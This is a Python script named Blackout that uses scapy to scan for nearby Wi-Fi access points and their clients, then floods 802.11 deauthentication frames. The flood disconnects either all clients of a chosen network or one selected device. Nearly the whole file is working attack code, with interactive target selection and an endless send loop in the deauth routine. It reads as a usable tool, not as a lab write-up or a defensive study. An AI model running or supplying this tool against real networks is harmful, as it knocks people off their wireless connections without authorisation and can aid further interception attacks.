#!/usr/bin/python3

#  TODO Use closure the fix the signal_handler issue
#  TODO: look for a way to use threads instead of Processes (threads were harder to stop with Ctrl-C?)
#  TODO: Improve -- Ending the AP sniffing phase. It's too rough.
#  TODO: Can all the processes be daemonised?
#  TODO: Fix up argparse

import os
import re
import sys
import signal
import logging
import pickle
import argparse
from time import sleep
from turtle import color
from utils import *
from subprocess import Popen
from multiprocessing import Process, Manager
from scapy.all import *

# set scapy verbosity to zero
conf.verb = 0

# silence unwanted scapy output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

BROADCAST_ADDR = "FF:FF:FF:FF:FF:FF"


class Blackout:

    def __init__(self, interface):

        # Set scapy sniff interface
        conf.iface = interface

        # Compile list of vendors
        self.vendors = compile_vendors()

        # see multiprocessing.Manager
        self.proc_manager = Manager()

        # These data structures are shared between Processes created with
        # multiprocessing.Process, and the Process we start
        # the program in, as is my understanding.
        self.ap_dict = self.proc_manager.dict()
        self.all_bssid = self.proc_manager.list()
        self.ap_clients = self.proc_manager.list()

        # Declare some necessary variables
        self.target_ap = None
        self.target_bssid = None
        self.target_client = None

        # Channel hopping process
        self.proc_channel_hop = Process(target=Blackout.channel_hop, args=(conf.iface,))
        # Make the process run in the background as a daemon
        self.proc_channel_hop.daemon = True


        # AP sniffer Process
        self.proc_sniff_ap = Process(
            target=sniff, kwargs={
                'prn': self.sniff_access_points,
                'iface': conf.iface,
                'store': 0})


        # Client sniffer Process
        self.proc_sniff_clients = Process(
            target=sniff,
            kwargs={
                'prn': self.sniff_clients,
                'iface': conf.iface,
                'store': 0})

    def run(self):
        try:
            start_mon(conf.iface)
            self.proc_channel_hop.start()

            # Sniff for Wireless Access Points
            self.proc_sniff_ap.start()

            print(f"{Colour.BOLD}Sniffing for Access Points on all channels...{Colour.ENDC}\n")
            

            # Wait for processes to terminate
            self.proc_channel_hop.join()
            self.proc_sniff_ap.join()

            # Output a very simple summary of findings
            horizontal_rule(30)
            print(f"\nAccess Points discovered: {len(self.ap_dict)}\n\n")

            # Select an target AP
            self.target_ap = self.select_target_ap()
            
            # Important to make it upper for comparisons in self.sniff_clients
            self.target_bssid = self.target_ap['bssid'].upper()

            choice = choose_mode()

            # Deuth ALL clients from AP
            if choice == '1':
                Blackout.deauth(
                    self.target_ap['bssid'],
                    str(self.target_ap['channel']),
                    BROADCAST_ADDR)

            # Deauth specific client from AP
            elif choice == '2':
                self.proc_sniff_clients.start()
                self.proc_sniff_clients.join()

                self.list_clients()
                self.select_target_client()

                Blackout.deauth(
                    self.target_ap['bssid'],
                    str(self.target_ap['channel']),
                    self.target_client)

        except Exception as e:
            print(f"[!] Error: {e}")
            sys.exit(0)

        except KeyboardInterrupt:
            pass

        finally:
            # Put network card back into managed mode
            stop_mon(conf.iface)

            # record the detected AP's
            # with open("report.txt", "w") as f:
            #     for k, v in _ap_dict.items():
            #         f.write(f"{k} | {v[1]} | {v[2]}\n")

            # END
            sys.exit(0)

    @staticmethod
    def deauth(bssid, channel, target):
        """
        create deauth packets and send them to the target AP
        TODO:
        Allow multiple targets, including clients aswell as AP's
        """

        if target is BROADCAST_ADDR:
            print(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...")
        else:
            print(f"[*] Deauthing {target} from {bssid} on channel {channel}...")

        try:
            go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
            go_to_chan.communicate()

            dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid)
            # create deauth packet for AP and add to list
            deauth_pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)

            # send it
            # I don't think you're really supposed to use a for loop for this,
            # instead use the count argument to set number of packets. However,
            # I found this to be more reliable.
            try:
                while True:
                    sendp(deauth_pkt, iface=conf.iface)

            except KeyboardInterrupt:
                print("[*] Keyboard Interrupt\n")
            except Exception as e:
                print(f"[!] Error: {e}")
                stop_mon(conf.iface)
                sys.exit(0)

            print("[*] Deauthentication Complete")
            return

        except Exception as e:
            print(f"[!] Error while Deauthenticating: {e}")

    def select_target_client(self):
        horizontal_rule(30)

        target_id = int(input("\nEnter ID of the client you wish to target: "))

        #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
        # [{'1': [client info, ]}, {'2', [client info, ... ]}, ... ]
        self.target_client = self.ap_clients[target_id - 1]

        horizontal_rule(30)
        print(f"\nTargeting Client: [{self.target_client}]\n")
        horizontal_rule(30)

    def sniff_clients(self, pkt):

        horizontal_rule(30)
        print(f"{Colour.BOLD}Sniffing for clients of AP - {self.target_ap['bssid']}...\n{Colour.ENDC}")

        # Go to correct channel
        channel = str(self.target_ap['channel'])
        go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
        go_to_chan.communicate()

        # IF right type of frame, and not involved in authentication
        try:
            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2): # and not pkt.haslayer(EAPOL):
                # Packet is a Data or Control Frame
                if pkt.addr1 and pkt.addr2:

                    # Get destination and source MAC addresses
                    dst = pkt.addr1.upper()
                    src = pkt.addr2.upper()

                    # If the target AP is either source or destination, we know the other is a client
                    if src == self.target_bssid and dst not in self.ap_clients:
                        self.ap_clients.append(dst)
                        print(f"[*] {dst}\t{self.get_vendor(dst)}")

                    elif dst == self.target_bssid and src not in self.ap_clients:
                        self.ap_clients.append(src)
                        print(f"[*] {src}\t{self.get_vendor(src)}")

        except Exception as e:
            print(f"[*] sniff_clients error: {e}")

    def list_clients(self):
        print("\n")
        horizontal_rule(20)
        for i, client in enumerate(self.ap_clients):
            # Find manufacturer
            name = self.get_vendor(client)
            print(f"{i + 1}) {client}\t{name}")

    def select_target_ap(self):
        horizontal_rule(30)

        target_id = int(input("\nEnter ID of the AP you wish to target: "))

        #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
        target_ap = self.ap_dict[target_id]

        horizontal_rule(30)
        print(f"\nSelected Access Point [{target_id}]\n")
        print(f"\tssid:\t\t{target_ap['ssid']:20}")
        print(f"\tbssid:\t\t{target_ap['bssid']:20}")
        print(f"\tchannel:\t\t{target_ap['channel']:20}\n")
        horizontal_rule(30)

        return target_ap

    def sniff_access_points(self, pkt):
        """
        Sniff packets, and extract info from them
        """
        # Here scapy is going to check whether each sniffed packet
        # has particular 'layers' of encapsulation
        # and act accordingly

        print(f"{Colour.BOLD}Sniffing for Access Points...{Colour.ENDC}")

        if pkt.haslayer(Dot11):
            # Check for beacon frames or probe responses from AP's
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                print("Found interesting packeet...")
                # If the packet contains a BSSID we have not encountered
                if pkt.addr3.upper() not in self.all_bssid:  # addr3 -> BSSID

                    bssid = pkt.addr3.upper()  # add the bssid to our bssid list
                    self.all_bssid.append(bssid)

                    try:
                        count = len(self.ap_dict) + 1  # No. of AP's collected
                        ssid = pkt[3].info.decode()  # Extract SSID
                        if not re.match(r'[\w\-\.]+', ssid):  # Check for valid SSID
                            ssid = "*HIDDEN/NONE*"  # SSID is hidden

                        # credit to airoscapy.py(by iphelix) for this
                        # It's decoding the channel info from an awkward hex formatting('/x03' etc.)

                        channel = ord(pkt[Dot11Elt:3].info)

                        # Add Access-Point to the 'cross-process' dict
                        self.ap_dict[count] = {'bssid': bssid, 'ssid': ssid, 'channel': channel}
                        vendor = self.get_vendor(bssid)

                        # Output the catch
                        print(f"%2d)\t{Colour.OKBLUE}%-20s\t{Colour.OKGREEN}%-20s\t{Colour.ENDC}%2d\t\t%-20s" % (
                            count, ssid, bssid, channel, vendor))

                    except Exception as e:
                        if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                            pass
                        else:
                            print(f"[!] Sniffer Error: {e}")

    def get_vendor(self, bssid):
        name = ""
        try:
            name = self.vendors[bssid[:8]]
        except KeyError:
            name = "unknown device"

        return name

    @staticmethod
    def channel_hop(self):
        """
        Hop channels until interrupted
        """

        # total of 13 channels to search through
        limit = 14

        while True:
            for i in range(1, 14): 
                channel = i % limit
                #print(channel)

                # using Popen instead of os.system here avoids superfluous
                # output to the terminal from the iw command
                # which at times can crash the program (I'm not sure why yet)
                # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work

                #print("{} - {}".format(conf.iface, type(conf.iface)))
                p = Popen(["iw", "dev", str(conf.iface), "set", "channel", str(channel)])
                try:
                    # effectively execute p
                    p.communicate()
                    sleep(1)  # TODO -- Experiment with different values
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[!] {Colour.FAIL}Channel Hop Error: {e}{Colour.ENDC}")

    def signal_handler(self, sig, stack_frame):
        """
        This handles an interrupt signal, like
        Ctrl-C. Once detected, the program will sleep
        So we can 'get our affairs in order'(read 'print summary')
        """
        sleep(1)

        try:
            self.proc_channel_hop.terminate()
            self.proc_channel_hop.join()
        except Exception:
            pass

        try:
            self.proc_sniff_ap.terminate()
            self.proc_sniff_ap.join()
        except Exception:
            pass

        try:
            self.proc_sniff_clients.terminate()
            self.proc_sniff_clients.join()
        except Exception:
            pass


if __name__ == "__main__":

    blackout = Blackout("wlan0")

    # Set the signal handler
    signal.signal(signal.SIGINT, blackout.signal_handler)

    try:
        blackout.run()

    except Exception as e:
        print(f"[!] Error running blackout.run(): {e}")
        sys.exit(0)

    except KeyboardInterrupt:
        pass


